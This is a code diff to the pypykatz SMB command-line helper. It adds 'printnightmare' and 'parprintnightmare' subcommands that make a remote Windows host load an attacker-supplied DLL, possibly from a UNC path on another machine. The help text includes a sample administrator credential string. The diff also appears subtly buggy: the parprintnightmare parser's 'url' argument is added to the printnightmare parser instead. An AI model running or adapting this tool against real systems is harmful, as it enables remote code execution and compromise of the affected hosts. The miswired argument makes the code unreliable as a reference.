@@ -125,6 +125,17 @@ class SMBCMDHelper:
 		smb_shareenum_parser.add_argument('--et', '--exclude-target', nargs='*', help = 'Exclude hosts from enumeration')
 		smb_shareenum_parser.add_argument('smb_url', help = 'SMB connection string. Credentials specified here will be used to perform the enumeration')
 
+		printnightmare_group = smb_subparsers.add_parser('printnightmare', help='printnightmare')
+		printnightmare_group.add_argument('url', help="SMB connection string. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/'")
+		printnightmare_group.add_argument('dllpath', help='Path to the DLL to be loaded by the remote host. Either UNC (\\\\<ip>\\path\\to\\dll.dll) or Full file path on the remote computer (C:\\path\\to\\dll.dll). Latter is useful if you have write permissions on the remote machine')
+		printnightmare_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
+		printnightmare_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
+		
+		parprintnightmare_group = smb_subparsers.add_parser('parprintnightmare', help='par printnightmare')
+		printnightmare_group.add_argument('url', help="SMB connection string. Example: 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/'")
+		parprintnightmare_group.add_argument('dllpath', help='Path to the DLL to be loaded by the remote host. Either UNC (\\\\<ip>\\path\\to\\dll.dll) or Full file path on the remote computer (C:\\path\\to\\dll.dll). Latter is useful if you have write permissions on the remote machine')
+		parprintnightmare_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
+		parprintnightmare_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
 
 
 
@@ -201,6 +212,17 @@ class SMBCMDHelper:
 		live_shareenum_parser.add_argument('--ed', '--exclude-dir', nargs='*', help = 'Exclude directories with name specified')
 		live_shareenum_parser.add_argument('--et', '--exclude-target', nargs='*', help = 'Exclude hosts from enumeration')
 
+		live_printnightmare_group = live_smb_subparsers.add_parser('printnightmare', help='printnightmare')
+		live_printnightmare_group.add_argument('host', help='Target host to connect to')
+		live_printnightmare_group.add_argument('dllpath', help='Path to the DLL to be loaded by the remote host. Either UNC (\\\\<ip>\\path\\to\\dll.dll) or Full file path on the remote computer (C:\\path\\to\\dll.dll). Latter is useful if you have write permissions on the remote machine')
+		live_printnightmare_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
+		live_printnightmare_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
+		
+		live_parprintnightmare_group = live_smb_subparsers.add_parser('parprintnightmare', help='par printnightmare')
+		live_parprintnightmare_group.add_argument('host', help='Target host to connect to')
+		live_parprintnightmare_group.add_argument('dllpath', help='Path to the DLL to be loaded by the remote host. Either UNC (\\\\<ip>\\path\\to\\dll.dll) or Full file path on the remote computer (C:\\path\\to\\dll.dll). Latter is useful if you have write permissions on the remote machine')
+		live_parprintnightmare_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
+		live_parprintnightmare_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
 
 		live_group = live_parser.add_parser('smb', help='SMB (live) commands', epilog=smb_live_epilog, parents=[live_subcommand_parser])
 		
@@ -331,6 +353,22 @@ class SMBCMDHelper:
 						print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
 					else:
 						print(str(po))
+		
+		elif args.livesmbcommand == 'parprintnightmare':
+			from pypykatz.smb.printer import parprintnightmare
+			_, err = await parprintnightmare(smb_url, args.dllpath)
+			if err is not None:
+				print('Parprintnightmare failed! %s' % err)
+				return
+			print('Parprintnightmare OK!')
+
+		elif args.livesmbcommand == 'printnightmare':
+			from pypykatz.smb.printer import printnightmare
+			_, err = await printnightmare(smb_url, args.dllpath)
+			if err is not None:
+				print('Printnightmare failed! %s' % err)
+				return
+			print('Printnightmare OK!')
 
 		elif args.livesmbcommand == 'shareenum':
 			from pypykatz.smb.shareenum import shareenum
@@ -563,6 +601,22 @@ class SMBCMDHelper:
 						la.commands.append(command)
 
 			await amain(la)
+		
+		elif args.smb_module == 'printnightmare':
+			from pypykatz.smb.printer import printnightmare
+			_, err = await printnightmare(args.url, args.dllpath)
+			if err is not None:
+				print('Printnightmare failed! %s' % err)
+				return
+			print('Printnightmare OK!')
+		
+		elif args.smb_module == 'parprintnightmare':
+			from pypykatz.smb.printer import parprintnightmare
+			_, err = await parprintnightmare(args.url, args.dllpath)
+			if err is not None:
+				print('Parprintnightmare failed! %s' % err)
+				return
+			print('Parprintnightmare OK!')
 
 	def process_results(self, results, files_with_error, args, file_prefix = ''):
 		if args.outfile and args.json:
